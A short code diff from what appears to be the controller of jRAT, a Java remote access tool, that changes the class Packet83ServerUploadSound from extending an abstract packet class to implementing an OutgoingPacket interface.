@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet83ServerUploadSound extends AbstractOutgoingPacket {
+public class Packet83ServerUploadSound implements OutgoingPacket {
 
 	private byte[] data;
 	private int read;
